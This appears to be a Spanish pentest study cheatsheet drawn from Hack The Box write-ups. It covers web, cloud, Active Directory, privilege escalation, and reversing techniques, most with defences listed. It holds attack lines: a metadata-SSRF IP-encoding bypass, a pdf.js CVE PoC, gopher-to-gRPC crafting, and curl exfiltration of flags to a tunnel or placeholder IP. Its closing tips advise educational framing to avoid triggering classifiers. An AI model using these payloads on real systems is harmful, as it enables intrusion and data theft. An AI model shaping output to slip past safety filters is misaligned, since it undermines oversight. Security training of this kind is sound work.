# 🧰 ARSENAL — herramientas y técnicas de pentest (HTB + prep de entrevista)

> Compilado para **estudio / CV / prep de entrevista de pentest**. Cada técnica va con *qué es*, *cómo se usa* y su *defensa* (para poder explicarla en pizarra).
> Boxes de referencia: **Resizer** (Hard web), **Nimbus** (Hard cloud/AWS), **ArtificialUniversity** (Insane web, client-side→SSRF→gRPC RCE), **Sandcastle**/**Callfuscated** (Insane pwn/rev), **Blinded** (Insane heap pwn).
> Método reusable en [PLAYBOOK.md](PLAYBOOK.md). Writeups por box: `Resizer.md`, `Nimbus.md`, `ArtificialUniversity.md`, `Sandcastle.md`, `Callfuscated.md`, `Blinded_research-notes.md`.
> Referencias madre: HackTricks · PayloadsAllTheThings · hackingthe.cloud · SecLists · GTFOBins/LOLBAS · revshells.com · The Hacker Recipes (AD).

---

## 1. Reconocimiento y enumeración

| Herramienta | Para qué |
|---|---|
| **nmap** | puertos + fingerprint. `-p- --min-rate 3000 -T4 -Pn -n` (rápido) → `-sVC -p<abiertos>` (versión+scripts NSE) |
| **ffuf** / **feroxbuster** / **gobuster** | fuzzing de vhosts, dirs, params. ffuf: `-H "Host: FUZZ.dom" -fs <baseline>` (vhost) · `-u host/FUZZ` (dirs) |
| **curl** | cliente HTTP manual (headers, métodos, SSRF). `-H`, `-X`, `--data-urlencode`, `-w "%{http_code}"` |
| **seclists** | wordlists (`/usr/share/seclists`): `Discovery/DNS/*`, `Discovery/Web-Content/*`, `rockyou.txt` |
| **whatweb / nikto / wappalyzer** | tech-stack y quick wins web |
| **dig / dnsenum / dnsrecon** | DNS: transferencias de zona (`dig axfr @ns dom`), subdominios |

**Orden de oro:** `puertos → vhosts → dirs → params`. El paso **vhosts** es el que costó Nimbus.

---

## 2. Explotación web

| Técnica | Qué es · cómo detectar | Defensa (entrevista) |
|---|---|---|
| **SQLi** | input llega a la query. `' OR 1=1-- -`, UNION, blind/time-based (`sqlmap`) | queries parametrizadas / prepared statements, ORM, mínimo privilegio de DB |
| **SSTI** | template evalúa input (`{{7*7}}`→49). Jinja2/Twig/Freemarker → RCE | no meter input en templates; sandbox; `render` con contexto, no string-format |
| **XXE** | XML parser resuelve entidades externas → leer archivos / SSRF | deshabilitar DTDs/external entities en el parser |
| **Path traversal → write** | `../` escapa el dir. **Resizer**: write arbitrario → shadow `.so` de namespace pkg → RCE | normalizar+validar rutas (`realpath` en jail); no concatenar input a paths |
| **LFI/RFI** | incluir archivos locales/remotos → log poisoning / `php://filter` / RCE | allow-list de includes, no incluir por input |
| **File upload** | subir webshell/bypass de extensión (doble ext, magic bytes, `.phtml`) | validar tipo real, renombrar, servir fuera del webroot |
| **SSRF** | el server pide una URL que elegís → servicios internos, **IMDS cloud** | allow-list de destinos, bloquear IPs internas/link-local (ver §3) |
| **Deserialización** | `yaml.load()`/pickle/Java `readObject`/.NET `BinaryFormatter` instancian objetos → RCE. **Nimbus**: worker `yaml.load(Loader=Loader)` | `safe_load`/allow-list de clases; validación por esquema |
| **JWT** | `alg:none`, secreto débil (crackear con `hashcat -m 16500`), confusión RS/HS | firmar y **verificar** alg; secretos fuertes |
| **Auth bypass / IDOR** | cambiar IDs, forzar roles, mass-assignment | authz por objeto server-side, no confiar en el cliente |

---

## 2b. 🎓 Cadena client-side → SSRF → gRPC RCE (de ArtificialUniversity — Insane web)

> Cadena larga de web moderna: **bug de lógica → bot admin → CVE de cliente → bypass SameSite → SSRF gopher → RCE en microservicio interno**. Cada eslabón es una técnica reusable. Root final.

**1. Auth bug por rama de código.** Un endpoint con dos caminos (`if product_id:` vs `else:`) donde el check de login solo cubría una rama → la otra quedaba **sin auth y con parámetros sensibles controlables** (precio, `user_id`, `email`). *Lección:* auditar la autorización en **cada** rama; los guard-clauses que solo disparan en un branch dejan huecos. *Defensa:* authz centralizada (decorador/middleware), no por-rama.

**2. Bot "admin" que visita una URL construida con tu input.** Un headless browser privilegiado (Selenium/Firefox) logueado como admin visitaba `.../invoice_{payment_id}.pdf`, con `payment_id` controlado por el atacante → **path traversal** (`/../../../admin/x`) para redirigir al bot a **cualquier endpoint same-origin como admin** = CSRF-GET autenticado. *Defensa:* nunca interpolar input en URLs que abre el bot; canonicalizar/validar; el bot no debe navegar a rutas derivadas de input.

**3. CVE-2024-4367 — JS arbitrario vía pdf.js (Firefox < 126).** Un endpoint "view-pdf" fetcheaba una URL y la servía **same-origin como `application/pdf`** → el visor pdf.js del bot renderiza un PDF malicioso cuyo **`/FontMatrix`** contiene un elemento string no saneado que rompe el JS generado en `getPathGenerator` → **ejecución de JS arbitrario en el origen de la app**. PoC: `/FontMatrix [1 0 0 1 0 (0\); <JS> //)]` sobre un PDF con fuente CFF embebida (glifos que fuercen el path generator). *Pista de diseño:* el Dockerfile **pinea Firefox 125.0.1** (fixeado en 126) — ver §"version-pinning". *Defensa:* actualizar pdf.js ≥4.2.67 / Firefox ≥126; no renderizar PDFs no confiables same-origin.

**4. Bypass de SameSite=Lax con form POST top-level.** El JS del CVE corre en un contexto de **origen opaco** (`document.domain='pdf.js'`): un `fetch`/XHR **subresource NO lleva la cookie de sesión** (cookie sin atributo SameSite → Lax por defecto). Pero un **`<form>` POST top-level** (`f.submit()`) **SÍ** la manda (Lax permite cookie en navegación top-level). Clave: apuntar el form al **host interno que usa el bot** (`http://127.0.0.1:1337`), no a la IP externa — la cookie está atada a ese host. *Defensa:* `SameSite=Strict` + **tokens CSRF** en todo endpoint que cambie estado; no exponer acciones sensibles por GET/POST sin token.

**5. curl gopher SSRF → bytes crudos a un puerto interno.** El endpoint admin corría `curl <url>` con la URL controlada → `gopher://127.0.0.1:50051/_<bytes url-encoded>` envía **cualquier byte a cualquier TCP** (clásico SSRF-a-TCP). *Pista de diseño:* el Dockerfile **compila curl 7.70.0 de fuente** — porque curl viejo **manda NULL bytes** en el selector gopher, mientras **curl 8.x los rechaza** (`URL malformed`); los frames HTTP/2 están llenos de `\x00`, así que el pin de versión es esencial. *Defensa:* en fetchers server-side, allow-list de esquemas (solo http/https), bloquear `gopher/dict/file/…`, resolver+validar destino (no internos/link-local).

**6. gopher → gRPC (HTTP/2 a mano).** Para hablarle a un gRPC interno por gopher, se arman los frames h2 crudos: **preface** (`PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n`) + **SETTINGS** vacío + **HEADERS** (HPACK literal: `:method POST`, `:scheme http`, `:path /paquete.Servicio/Metodo`, `:authority host`, `content-type: application/grpc`, `te: trailers`) + **DATA** (mensaje gRPC = 1 byte flag + 4 bytes len big-endian + protobuf). Varios **streams** (id 1,3,5…) para varias llamadas en un tiro. Encoding protobuf de un `map<string,Msg>`: entry con field1=key, field2=value. *Defensa:* gRPC no debe ser alcanzable por SSRF (network policy); mTLS.

**7. "Prototype pollution" en Python → `eval` RCE.** Un RPC "Debug" hacía un **merge recursivo de un dict del atacante en `self.__dict__`** del servicio → permitía **crear atributos arbitrarios** (ej. `price_formula`), y otro RPC hacía `eval(self.price_formula)` → **RCE como root**. Es el análogo Python de prototype pollution (contaminar el objeto vía `__dict__`). *Defensa:* nunca mergear datos no confiables en atributos de objetos; jamás `eval` sobre datos; validar por esquema estricto.

**8. Version-pinning = pista.** Cuando un Dockerfile **compila de fuente una versión vieja** (curl 7.70.0) o **pinea un browser** (Firefox 125.0.1), asumí que el exploit **depende de un comportamiento específico de esa versión** (aquí: nulls en gopher, y el CVE de pdf.js). Es señal, no ruido.

**Metodología de armado (clave para cadenas largas):** aislar **cada eslabón con un beacon observable** (callback a un listener propio) antes de encadenar; exponer el listener al target cloud con **cloudflared** (tunnel HTTPS); y **validar el crafting más frágil (gopher/HTTP2) localmente** contra el mismo servicio (levantar el gRPC del zip) antes de disparar al target. Exfil final: `eval` server-side hace `curl https://TUN/x?f=$(cat /flag*.txt|base64 -w0)` (base64 para chars seguros).

---

## 3. Cloud / AWS (patrón Nimbus — actualizado con lo aprendido EN VIVO)

| Herramienta | Para qué |
|---|---|
| **awscli** | `aws --endpoint-url http://host ...` contra mocks |
| **boto3** | SDK Python; override de `getaddrinfo` para resolver un vhost a la IP + firma SigV4 sola |
| **LocalStack** | emulador AWS (community/pro) típico en boxes cloud; `/{_localstack/health}` lista servicios corriendo |
| **pacu / scoutsuite** | post-explotación/audit de cuentas AWS reales |

**Cadena Nimbus (confirmada en vivo):**
1. **SSRF con bypass de filtro:** el fetcher exigía URL terminada en `.yaml` (bypass: `?z=.yaml`) **y** bloqueaba IPs internas resueltas. **Bypass del bloqueo de IP: codificar la IP en DECIMAL (`2852039166`) u OCTAL (`0251.0376.0251.0376`) = `169.254.169.254`** → el filtro naíve no la reconoce como interna.
2. **SSRF → IMDS:** `/latest/meta-data/iam/security-credentials/<rol>` → **credenciales temporales de IAM** del rol de la instancia.
3. **Usar las creds:** el mock AWS estaba como vhost (`aws.host`); con boto3 directo → SQS → job con **YAML deser** → RCE en el worker (contenedor).
4. **Privesc — el insight clave:** el control de IAM (que rechazaba acciones) estaba en el **proxy nginx**, NO en LocalStack. **LocalStack community edition NO enforcea IAM.** Pegándole **directo al `:4566` interno** (desde el contenedor comprometido) → **todos los servicios sin restricción** (codebuild, iam, secrets...). CodeBuild privilegiado → escape al host → root.

**Checklist con creds robadas:** `sts get-caller-identity` · `sqs list-queues` · `s3 ls` · `secretsmanager list-secrets`+`get-secret-value` · `ssm get-parameters` · `iam list-roles`/`get-role-policy` (AssumeRole a más privilegio) · `lambda list-functions`.

**Trampas de método (de sufrir Nimbus en vivo):**
- **App single-threaded + fetch SSRF sin timeout = self-DoS.** Si el destino del SSRF (IMDS) no responde, el fetch se cuelga y **traba toda la app**. En box recién spawneado, esperar a que el cloud levante (~1-2 min) y tirar **UN** SSRF, nunca rapid-fire.
- **Creds del mock suelen ser estáticas** (mismas en cada spawn) — guardalas y reusalas; no re-leakees en loop.

---

## 4. 🏛️ Active Directory (el hueco #1 para la chamba)

> La mayoría del pentest corporativo real (y muchos HTB Hard/Insane) es AD. Es lo que más te conviene dominar.

**Enumeración**
| Tool | Para qué |
|---|---|
| **nxc** (NetExec, ex-crackmapexec) | barrido SMB/LDAP/WinRM/MSSQL: `nxc smb <ip> -u u -p p --shares`, `--users`, `--pass-pol` |
| **BloodHound** + **SharpHound/bloodhound-python** | grafo de relaciones AD → camino más corto a Domain Admin |
| **ldapsearch / windapsearch** | dump de usuarios, grupos, descripciones (passwords en `description`) |
| **enum4linux-ng / rpcclient** | usuarios/shares por RPC/SMB null-session |
| **kerbrute** | user-enum + password spray vía Kerberos |

**Ataques núcleo**
| Ataque | Idea (1 línea) |
|---|---|
| **AS-REP roasting** | usuarios sin pre-auth Kerberos → hash crackeable (`impacket-GetNPUsers`) |
| **Kerberoasting** | pedir TGS de cuentas con SPN → hash crackeable (`impacket-GetUserSPNs`) |
| **Password spray** | 1 password vs muchos users (cuidado con lockout) |
| **NTLM relay** | `ntlmrelayx` + `responder` → autenticar en otro host sin crackear |
| **DCSync** | con derechos de replicación → dumpear todos los hashes (`secretsdump @dc`) |
| **Pass-the-Hash / Ticket** | autenticar con hash NTLM / ticket Kerberos sin la password (`-H`, `.ccache`) |
| **ADCS (Certipy)** | plantillas de certificado mal configuradas (ESC1-8) → escalada a DA |
| **Constrained/Unconstrained delegation** | abusar delegación para impersonar |

**Herramientas de ejecución:** `impacket` (psexec/wmiexec/secretsdump/GetUserSPNs…), `evil-winrm` (shell WinRM), `certipy`, `bloodyAD`, `mimikatz`/`nanodump` (creds en memoria).

**Flujo típico HTB-AD:** null-session/user leak → roasting → crackear → BloodHound → abusar ACL/delegación/ADCS → DCSync → DA.

---

## 5. 🔀 Pivoting & tunneling (imprescindible con >1 host / AD)

| Tool | Para qué |
|---|---|
| **chisel** | túnel TCP/SOCKS sobre HTTP (server en kali, client en el target) |
| **ligolo-ng** | pivoting moderno vía interfaz `tun` (cómodo para subredes internas) |
| **sshuttle** | "VPN por SSH" a una subred si tenés creds SSH |
| **ssh -L / -R / -D** | port-forward local/remoto / proxy SOCKS dinámico |
| **proxychains** | forzar cualquier tool a través del SOCKS del pivot |

**Idea:** comprometés host A (con acceso a la red interna), montás un SOCKS por A, y con `proxychains nxc/impacket ...` atacás hosts internos que no tocás directo.

---

## 6. 🐧 Privesc Linux

**Enumeración:** `linpeas.sh`, `pspy` (procesos/cron sin root), `sudo -l`, `id`, `find / -perm -4000` (SUID), `getcap -r /`, `crontab -l` + `/etc/cron*`, `cat /etc/mounts`.

| Vector | Cómo |
|---|---|
| **sudo mal config** | `sudo -l` → binario abusable (**GTFOBins**) |
| **SUID / capabilities** | binario SUID root o `cap_setuid`/`cap_dac_...` abusable (GTFOBins) |
| **cron / scripts writable** | script corrido por root que podés editar (`pspy` para verlos) |
| **PATH hijack** | script root que llama un binario por nombre relativo |
| **kernel exploit** | último recurso (DirtyPipe/DirtyCOW/pwnkit según versión) |
| **NFS `no_root_squash`** | montar y dejar un SUID root |

**Container escape (checklist que usé en Nimbus):** `id` + `/proc/self/status` (CapEff — ¿caps extra?), `ls /var/run/docker.sock` (socket montado = escape trivial), `cat /proc/mounts` (¿monta el host? `/dev/sd*`, `/host`), `find / -perm -4000`, `capsh --print`. Si `CapEff=0` y sin docker.sock ni mounts del host → contenedor blindado, buscar el privesc por **red/cloud** (como en Nimbus → LocalStack).

---

## 7. 🪟 Privesc Windows

**Enumeración:** `winPEAS`, `PowerUp.ps1`, `whoami /priv`, `whoami /all`, `systeminfo`.

| Vector | Cómo |
|---|---|
| **SeImpersonate/SeAssign** | *Potato* (Juicy/Rogue/GodPotato) → SYSTEM. Común en cuentas de servicio/IIS/MSSQL |
| **Unquoted service path** | ruta de servicio con espacios sin comillas → plantar binario |
| **Weak service perms** | servicio reconfigurable (`sc config`) → correr tu binario como SYSTEM |
| **AlwaysInstallElevated** | instalar `.msi` como SYSTEM |
| **Creds guardadas** | `cmdkey /list`, registry (`reg query`), archivos `unattend.xml`/`web.config` |
| **DLL hijacking** | DLL faltante en un path escribible cargada por proceso privilegiado |

---

## 8. 🔓 Password attacks / cracking

| Tool | Para qué |
|---|---|
| **hashcat** | cracking GPU. Modos: `-m 0` MD5, `-m 1000` NTLM, `-m 1800` sha512crypt, `-m 13100` Kerberoast, `-m 18200` AS-REP, `-m 16500` JWT, `-m 22000` WPA |
| **john** (JtR) | cracking CPU + `*2john` (ssh2john, zip2john, keepass2john…) para extraer hashes |
| **hydra** / **medusa** | brute-force de servicios online (ssh, ftp, http-form) — cuidado con lockout |
| **rockyou.txt** + **rules** (`best64`, `OneRuleToRuleThemAll`) | wordlist base + mutaciones |

---

## 9. 🐚 Shells & post-explotación

- **Reverse shell:** listener (`nc -lvnp`/`pwncat-cs`/`rlwrap nc`) + callback del target. Catálogo: **revshells.com**. Si no hay conectividad de vuelta → **escribir tu clave SSH** en `~/.ssh/authorized_keys` (si el 22 es alcanzable) o exfil por callback HTTP (lo que usé en Nimbus).
- **Estabilizar TTY:** `python3 -c 'import pty;pty.spawn("/bin/bash")'` → `Ctrl-Z` → `stty raw -echo; fg` → `export TERM=xterm`.
- **Exfil sin shell interactiva:** ejecutar comando, `base64` el output, mandarlo por `curl http://MI-IP/x?d=<b64>` a un listener propio (patrón robusto cuando el canal interactivo es frágil).
- **Cred harvesting:** Linux → `/etc/shadow`, `.bash_history`, claves SSH, `.env`, `config.php`. Windows/AD → `secretsdump`, `mimikatz`/`nanodump` (LSASS), SAM/SYSTEM hives, `lazagne`.

---

## 10. Explotación de binarios / heap pwn (Blinded) [parked]

| Tool | Para qué |
|---|---|
| **gdb + pwndbg** | heap/arena, breakpoints, `vmmap` |
| **pwntools** | scripting (`process`, `remote`, `p64`, `fit`, `ELF`, `ROP`) |
| **readelf/objdump/strings** | protecciones (RELRO/NX/PIE/canary), offsets de libc |
| **patchelf / ld.so runner** | correr el binario con su libc exacta |
| **one_gadget / ropper / ROPgadget** | magic gadgets / cadenas ROP |

Conceptos glibc 2.35: House of Water (sembrar `main_arena`), FSOP (`_IO_FILE`), offsets clave (`system`, `_IO_2_1_stdout_`, `_IO_list_all`, `__free_hook`). **Nicho de exploit-dev, no pentest diario** → prioridad web/AD.

### VM / sandbox-escape pwn (de Sandcastle — Insane, clubby789)

Patrón "custom language / sandbox locked-down": te dan un intérprete (VM tipo Brainfuck, o bytecode) que corre tu programa con ops restringidas (FS/EXEC jaildeadas). El escape sale de un bug en la VM o en el sandbox. Técnicas clave:

- **Reversear la VM sin símbolos:** ubicar `main` (via `_start`→`__libc_start_main`), el **jump table de opcodes** (`lea rax,[rip+off]#tabla; mov eax,[tabla+op*4]; add rax,tabla; jmp rax`), y el fetch/decode. Los strings de debug (`SP/IP/STACK/Instruction`) y de error revelan la arquitectura.
- **Arquitectura broker + workers seccomp:** el proceso privilegiado (padre) atiende requests de los workers sandboxeados (hijos forkeados) por **pipes** + **memoria `MAP_SHARED`**. Cada worker tiene su propio filtro seccomp. Buscar la separación de privilegios y dónde se cruzan.
- **`open()` vs `popen()` differential:** un allow-list que valida un string como **path de archivo** (`open`+chequeo de MD5/hash) pero lo ejecuta como **comando de shell** (`popen`) → inyección. El bypass: crear/hacer que exista un archivo con el hash correcto pero **nombre que el shell parsea como 2 comandos**.
- **Bypass de sanitizador de paths que borra `/` y `.`:** meter el `/` recién en tiempo de shell con **`${PATH:0:1}`** (= primer char de `$PATH` = `/`), o `$(printf ...)`, etc. — sin `/` literal en el string.
- **Puntero de VM sin bounds-check = arbitrary R/W:** si los opcodes de mover-puntero no validan límites, `mem[base+ptr]` con `ptr` controlado = read/write arbitrario relativo a una base fija (útil con No-PIE). Con una op de OUTPUT tenés **leak** (leer GOT resuelto → libc; leer canary) → ROP.
- **Cuidado con el directorio:** las ops FS suelen operar en el `cwd`, mientras el EXEC puede prependear `../` — verificar que el archivo que creás caiga donde el chequeo lo busca.

### 🧩 Reversing: devirtualización de VM + MBA (de Callfuscated — Insane)

Patrón "crackme ofuscado a muerte": **call-obfuscation** (cada instr envuelta en `call`+`pop r8`+junk) + **VM** (intérprete de bytecode) + **MBA** (aritmética mixta) + **opaque predicates/junk**. La clave: **atacar la abstracción correcta con análisis DINÁMICO**, no pelear el asm estático.

- **Regla de oro:** contra call-obfuscation/instrucciones solapadas, el disasm lineal miente. **Single-step en orden de EJECUCIÓN** (gdb `stepi`) desenreda el flujo real.
- **No-PIE = regalo:** direcciones fijas → breakpoints e instrumentación triviales. Chequear `readelf -h` (Type EXEC vs DYN).
- **`srand()` con seed fijo (sin `time` importado) = fatal:** reimplementá glibc `rand()` (TYPE_3: `r[i]=(r[i-31]+r[i-3]); out=r[i]>>1`) y reproducís el keystream. PRNG no-cripto nunca es secreto.
- **Devirtualizar una VM sin símbolos:** ubicá el **dispatch** (`opcode=code[pc]`, cadena `cmp eax,N`/jump-table) y el **estado en el frame** (PC, SP, array de bytecode, stack de datos — todos `[rbp-off]`). Trazá **un hit por instrucción VM** (breakpoint en la cabeza del loop) y deducí cada opcode por su **efecto en el stack** (`PUSH/LOAD/MUL/XOR/SUB/OR…`). No necesitás entender la MBA: observás operandos→resultado.
- **MBA:** una op simple (`a^b`) reescrita como polinomio lineal con constantes mágicas (`imul 0xNNNN`, `not`, `and`). Ataque: **black-box** (operandos conocidos → salida) o simplificadores (SiMBA/msynth/Z3). En crackme instrumentable, black-box gana.
- **Control-flow input-independiente = oro:** si el nº de instrucciones/rand-calls no depende del input (sin early-exit), TODO lo que no sea el input es **constante capturable** (keystream, targets). Capturás con una corrida concreta y despejás el input.
- **gdb Python API** (`gdb.Breakpoint`, `parse_and_eval`, `stepi`) para instrumentar sin símbolos; correr headless con `gdb -nx -batch -x script.gdb` (el `-nx` evita gdbinit roto).
- **angr:** útil pero **muere con MBA** (expresiones gigantes) aunque el path sea único. Orden correcto: **devirtualizar primero**, angr después sobre el IR limpio (o hookear las funciones MBA a su op simple). No tirar angr ciego a un binario MBA-pesado.
- **Toolkit rev:** `objdump -d -M intel`, `readelf -S/-h/-d`, `gdb`(+pwndbg), `strings`, `python3` (reimplementar PRNG/VM), `z3`/`angr` si hace falta. Instalar: `pip install --break-system-packages angr z3-solver`.

### 🦜 Reversing multi-arch SIN qemu ni sudo (de Poly — Insane, jb0)

Cuando el binario es de otra arquitectura (ARM64/MIPS/…) y **no podés instalar qemu** (kali de Juan = sudo con password, cuelga headless):

- **Emular con Unicorn** (motor de qemu como lib Python, viene con angr): mapeás los segmentos LOAD, seteás SP, y hookeás `UC_HOOK_INTR` para implementar syscalls vos (`svc`): read=inyectar input, write=capturar stdout, exit=parar, open/mmap/brk=stubs. Corre self-modifying nativo, rapidísimo, computa hashes/CRC reales. Es LA forma de "correr" un ARM64 sin binfmt/root. Números de syscall ARM64: read=63, write=64, openat=56, close=57, exit_group=94, brk=214, mmap=222 (nº en `x8`, args `x0-x5`, ret en `x0`).
- **Desensamblar ARM64 con capstone** (`Cs(CS_ARCH_ARM64, CS_MODE_LITTLE_ENDIAN)`) cuando no hay `aarch64-linux-gnu-objdump`. Ojo: instrucciones 4-byte alineadas; si hay data embebida (magic, punteros) el linear-sweep se desincroniza → usar `skipdata=True` y realinear.
- **Reconocer primitivas cripto por sus CONSTANTES** (más rápido que reversar el algoritmo): **MD5** IV = `0x67452301 0xefcdab89 0x98badcfe 0x10325476` · **SHA1** IV = `…0x67452301…0xC3D2E1F0` · **SHA256** IV = `0x6a09e667…` · **CRC32** = loop `lsl #8 / lsr #24 / eor tabla[]` (poly 0xedb88320) · **AES** = S-box (`0x63,0x7c,0x77,0x7b…`).
- **`srand()`/PRNG sin `time` importado = determinista** → reproducir en Python y romper (ver Callfuscated).

### ⚠️ Decoys / defensa por engaño (lección de Poly)

- **Password plantado en rockyou = trampa.** Si un Insane se "resuelve" crackeando un hash con rockyou y sale fácil → sospechá. Poly plantó `il0vep0lly` que pasa el MD5-check pero lleva a *"nice try md5 cracker! …Go back to the start!"*. El flag real estaba escondido en otro lado (el banner). Regla del PLAYBOOK: **camino demasiado fácil = probablemente NO es el intended.**
- **Data gigante de alta entropía (ej. `.flag` 236KB) suele ser RUIDO** para distraer/inflar. Verificá con Hamming normalizado: ~4.0/byte = random (no es XOR de texto). No pierdas tiempo rompiéndola.
- **Multi-key XOR estego:** un mismo buffer puede tener 2+ mensajes con keys distintas (uno visible, el flag oculto). Si el binario descifra un buffer y solo imprime parte, bruteforceá el resto del buffer con otras keys buscando `HTB{`.

---

## 11. Mapa técnica → box (de un vistazo)

```
RESIZER   (Hard, web)     path traversal → arbitrary write → shadow .so → RCE (worker reboot)
NIMBUS    (Hard, cloud)   vhost-enum → SSRF (bypass IP decimal) → IMDS creds → SQS YAML deser → RCE
                          → LocalStack directo :4566 (sin IAM) → CodeBuild → root
ARTIFICIALUNIVERSITY      checkout unauth (precio arbitrario) → bot admin → path-traversal →
  (Insane, web)           view-pdf same-origin → CVE-2024-4367 (pdf.js/FF125) → JS en origen admin →
                          form POST top-level (bypass SameSite) → curl 7.70.0 GOPHER → gRPC
                          DebugService (prototype-pollution __dict__) → eval() → RCE root → exfil flag
SANDCASTLE (Insane, pwn)  VM Brainfuck (broker+workers seccomp) → arbitrary write (ptr sin bounds)
                          → open vs popen differential → popen prefix-bypass → flag
CALLFUSCATED (Insane rev) call-obf + VM bytecode + MBA → devirtualizar dinámico (gdb API) → keystream
POLY      (Insane, rev)   ARM64, decoys multicapa, /dev/null truco (fd 3) [en progreso]
BLINDED   (Insane, pwn)   House of Water → [pendiente FSOP]   [parked]
```

---

## 12. Cheatsheet de arranque

```bash
# 1. Puertos
nmap -p- --min-rate 3000 -T4 -Pn -n $IP -oG allports.gnmap
nmap -sVC -p<abiertos> -Pn -n $IP -oN services.txt
# 2. /etc/hosts si redirige
echo "$IP  dominio.htb" | sudo tee -a /etc/hosts
# 3. ★ VHOSTS (nunca saltar)
BASE=$(curl -s -H "Host: nope.dominio.htb" http://$IP/ | wc -c)
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt \
     -u http://$IP/ -H "Host: FUZZ.dominio.htb" -fs $BASE
# 4. Dirs
feroxbuster -u http://dominio.htb -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
# 5. Si hay Windows/AD:
nxc smb $IP -u '' -p '' --shares ; enum4linux-ng $IP
# 6. Si hay cloud/AWS mock:
aws --endpoint-url http://aws.dominio.htb sts get-caller-identity
```

---

## 13. Recordatorios de método (de cagadas reales)

1. **Vhost-enum SIEMPRE** antes de explotar profundo. (Perdí Nimbus por saltarlo.)
2. **Camino "imposible" = probablemente NO es el intended** → re-enumerar, no insistir.
3. **App single-threaded + fetch sin timeout = self-DoS.** Una request a la vez, espaciada; en box fresco esperar que el backend levante antes de tirar SSRF.
4. **El control de acceso puede estar en el proxy, no en el servicio** — buscar el backend "crudo" (ej. LocalStack `:4566` directo) que suele venir sin ese control.
5. **Documentar ofensiva con marco educativo** (payload + mitigación al lado), sin volcar tooling crudo en bloque (gatilla clasificadores y quema tokens).

Ver [PLAYBOOK.md](PLAYBOOK.md) para la versión canónica.
